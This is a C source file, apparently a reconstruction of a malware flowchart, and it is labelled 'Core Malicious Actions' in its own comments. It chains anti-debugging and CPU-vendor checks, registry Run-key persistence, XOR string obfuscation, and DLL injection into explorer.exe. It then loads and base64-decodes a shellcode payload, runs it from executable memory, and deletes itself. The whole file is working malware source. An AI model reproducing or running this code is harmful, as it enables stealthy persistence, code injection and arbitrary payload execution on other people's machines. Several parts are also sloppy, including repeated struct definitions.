
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>
#include <intrin.h>


#include <windows.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

BOOL Debugger_Identification() {
    BOOL isDebuggerPresent = FALSE;
    BOOL remoteDebuggerPresent = FALSE;
    HANDLE hProcess = GetCurrentProcess();

    // 1. IsDebuggerPresent()
    if (IsDebuggerPresent()) {
        isDebuggerPresent = TRUE;
    }

    // 2. CheckRemoteDebuggerPresent()
    CheckRemoteDebuggerPresent(hProcess, &remoteDebuggerPresent);

    return isDebuggerPresent || remoteDebuggerPresent;
}

#include <windows.h>
#include <stdio.h>

#ifndef _WIN64
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef struct _SYSTEM_PROCESSOR_INFORMATION {
    WORD  VendorId;
} SYSTEM_PROCESSOR_INFORMATION, *PSYSTEM_PROCESSOR_INFORMATION;
#endif


BOOL CPU_Identification() {
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 0);

    char vendor[13];
    memset(vendor, 0, sizeof(vendor));
    memcpy(vendor, &cpuInfo[1], 4);
    memcpy(vendor + 4, &cpuInfo[3], 4);
    memcpy(vendor + 8, &cpuInfo[2], 4);

    if (strcmp(vendor, "GenuineIntel") == 0) {
        return TRUE;
    } else {
        return FALSE;
    }
}

#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void AutoRun() {
    HKEY hKey;
    LONG result;
    wchar_t exePath[MAX_PATH];
    DWORD pathLength = MAX_PATH;

    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
        return; // Failed to get executable path
    }

    result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);

    if (result == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, L"MyApplication", 0, REG_SZ, (const BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));

        if (result != ERROR_SUCCESS) {
            // Handle error, e.g., log it
            printf("Failed to set registry value. Error code: %ld\n", result);
        }

        RegCloseKey(hKey);
    } else {
        // Handle error opening key
        printf("Failed to open registry key. Error code: %ld\n", result);
    }
}

#include <windows.h>

void String_XOR(char *string, char *key) {
    int string_length = 0;
    int key_length = 0;

    // Calculate string length
    while (string[string_length] != '\0') {
        string_length++;
    }

    // Calculate key length
    while (key[key_length] != '\0') {
        key_length++;
    }

    for (int i = 0; i < string_length; i++) {
        string[i] = string[i] ^ key[i % key_length];
    }
}

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#ifndef NTAPI
#define NTAPI __stdcall
#endif

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void DLL_Injection(char *dll, char *process) {
    DWORD processID = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, process) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);

    if (processID == 0) {
        printf("Process not found.\n");
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        printf("OpenProcess failed: %d\n", GetLastError());
        return;
    }

    LPVOID pRemoteString = VirtualAllocEx(hProcess, NULL, strlen(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteString == NULL) {
        printf("VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    if (!WriteProcessMemory(hProcess, pRemoteString, dll, strlen(dll) + 1, NULL)) {
        printf("WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (pLoadLibrary == NULL) {
        printf("GetProcAddress failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteString, 0, NULL);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteString, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    if (exitCode == 0) {
        printf("LoadLibrary failed in remote process.\n");
    }
}

#include <windows.h>
#include <stdio.h>

int Load_From_File(void *file_name, void *buffer) {
  HANDLE hFile;
  DWORD fileSize;
  DWORD bytesRead;

  hFile = CreateFile((LPCTSTR)file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

  if (hFile == INVALID_HANDLE_VALUE) {
    return 0; // Error opening file
  }

  fileSize = GetFileSize(hFile, NULL);

  if (fileSize == INVALID_FILE_SIZE) {
    CloseHandle(hFile);
    return 0; // Error getting file size
  }

  if (buffer == NULL) {
      CloseHandle(hFile);
      return fileSize;
  }
  
  if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
    CloseHandle(hFile);
    return 0; // Error reading file
  }

  CloseHandle(hFile);

  if (bytesRead != fileSize) {
      return 0;
  }

  return (int)fileSize;
}

#include <windows.h>

#ifndef NTAPI
#define NTAPI __stdcall
#endif

#ifndef UNICODE
typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;
} STRING, *PSTRING;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
#endif

int
Decode_Base64(void *encoded, int size, void *decoded)
{
    DWORD decoded_size = 0;

    if (!encoded || !decoded || size <= 0) {
        return 0;
    }

    if (!CryptStringToBinaryA(encoded, size, CRYPT_STRING_BASE64, decoded, &decoded_size, 0, NULL)) {
        return 0;
    }

    return (int)decoded_size;
}

#include <windows.h>

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
    PVOID DefaultLanguage;
    PVOID LoadConfigurationInfo;
    ULONG CodeIntegrityInfo;
    ULONG CodeIntegrityPolicy;
    ULONG VolatileInformation;
    ULONG Reserved5;
    ULONG Reserved6;
    ULONG Reserved7;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);

void Run_From_Memory(void *shellcode, int size) {
    SIZE_T regionSize = (SIZE_T)size;
    DWORD oldProtect;
    NTSTATUS status;

    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");

    if (NtProtectVirtualMemory == NULL) {
        // Handle error: Could not find NtProtectVirtualMemory
        return;
    }

    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &shellcode,
        &regionSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );

    if (status != 0) {
        // Handle error: NtProtectVirtualMemory failed
        return;
    }

    typedef void (*ShellcodeFunc)();
    ShellcodeFunc func = (ShellcodeFunc)shellcode;
    func();

    // Restore original protection (optional, but good practice)
    NtProtectVirtualMemory(
        GetCurrentProcess(),
        &shellcode,
        &regionSize,
        oldProtect,
        &oldProtect
    );
}

#include <windows.h>
#include <stdio.h>

void Delete_File(char *filename) {
    if (DeleteFileA(filename) == 0) {
        DWORD error = GetLastError();
        fprintf(stderr, "Error deleting file: %s, Error code: %lu\n", filename, error);
    } else {
        printf("File deleted successfully: %s\n", filename);
    }
}

#include <windows.h>
#include <stdio.h>

#ifndef UNICODE
typedef unsigned short WCHAR;
#define UNICODE
#endif

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void Delete_Itself() {
    WCHAR filename[MAX_PATH + 1];
    if (GetModuleFileNameW(NULL, filename, MAX_PATH) == 0) {
        return;
    }

    WCHAR cmd[MAX_PATH * 2 + 50];
    swprintf(cmd, sizeof(cmd) / sizeof(WCHAR), L"cmd /c del /f /q \"%s\" > nul 2>&1 & del /f /q \"%s\"", filename, filename);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    ExitProcess(0);
}


#include <windows.h>
#include <stdio.h>
#include <string.h>

// Function Prototypes (must match generated blocks)
BOOL Debugger_Identification();
BOOL CPU_Identification();
void AutoRun();
void String_XOR(char *string, char *key);
void DLL_Injection(char *dll, char *process);
int Load_From_File(void *file, void *buffer);
int Decode_Base64(void *encoded, int size, void *decoded);
void Run_From_Memory(void *shellcode, int size);
void Delete_File(char *filename);
void Delete_Itself();


int main() {
    // --- 1. Defense Evasion Checks ---
    
    // Check 1: Debugger Identification (Figure 6: Start -> Debugger Identification)
    printf("[*] Running Debugger Check...\n");
    if (Debugger_Identification()) {
        printf("[!] Debugger detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Debugger NOT detected. Continuing.\n");

    // Check 2: CPU Identification (Figure 6: Debugger Identification -> CPUID Check)
    printf("[*] Running CPU Identification Check (Intel target)...\n");
    if (!CPU_Identification()) {
        printf("[!] Target CPU NOT detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Target CPU detected. Continuing execution.\n");


    // --- 2. Core Malicious Actions ---
    
    // Action 1: Persistence (Figure 6: CPUID Check -> Set AutoRun)
    printf("[*] Setting Persistence (AutoRun)...\n");
    AutoRun();

    // Setup: XOR strings and buffers (for simplicity, we use hardcoded paths/names)
    char dll_name[] = "KERNEL32.DLL"; 
    char dll_key[] = "abc";
    char process_name[] = "explorer.exe";

    // Action 2: String XOR (Figure 6: Set AutoRun -> XOR String)
    printf("[*] XOR-ing DLL name string...\n");
    String_XOR(dll_name, dll_key);
    
    // Action 3: DLL Injection (Figure 6: XOR String -> Inject DLL)
    // NOTE: We XOR back here so DLL_Injection gets the plaintext name.
    String_XOR(dll_name, dll_key); 
    printf("[*] Injecting DLL into process: %s\n", process_name);
    DLL_Injection(dll_name, process_name);
    String_XOR(dll_name, dll_key); // Re-XOR for stealth

    // Action 4: Load and Decode Payload
    char file_path[] = "C:\\path\\to\\payload.b64";
    char payload_buffer[1024] = {0};
    unsigned char decoded_shellcode[1024] = {0};
    int n_read, n_decoded;

    // Load file (Figure 6: Load File)
    printf("[*] Loading payload from file: %s\n", file_path);
    n_read = Load_From_File(file_path, payload_buffer);
    
    // Decode Base64 (Figure 6: Decode Base64)
    printf("[*] Decoding Base64 payload (Size: %d)...\n", n_read);
    n_decoded = Decode_Base64(payload_buffer, n_read, decoded_shellcode);
    
    // Action 5: Execute Payload (Figure 6: Run Memory)
    if (n_decoded > 0) {
        printf("[*] Running shellcode from memory (Size: %d)...\n", n_decoded);
        Run_From_Memory(decoded_shellcode, n_decoded);
        printf("[+] Shellcode execution initiated.\n");
    } else {
        printf("[!] Payload decoding failed. Exiting.\n");
    }

    // --- 3. Normal Exit ---
    printf("[✔] Malicious workflow complete. Exiting normally.\n");
    return 0;


    // --- 4. Evasion and Exit Routine (Figure 6: Delete File -> Delete Itself -> Exit) ---
    EVASION_ROUTINE:
    
    // Action 6: Delete associated library file
    printf("[*] Deleting associated file: %s\n", dll_name);
    Delete_File(dll_name);
    
    // Action 7: Delete own executable
    printf("[*] Deleting self (Evidence removal)...\n");
    Delete_Itself();

    printf("[!] Evasion complete. Exiting.\n");
    return -1;
}
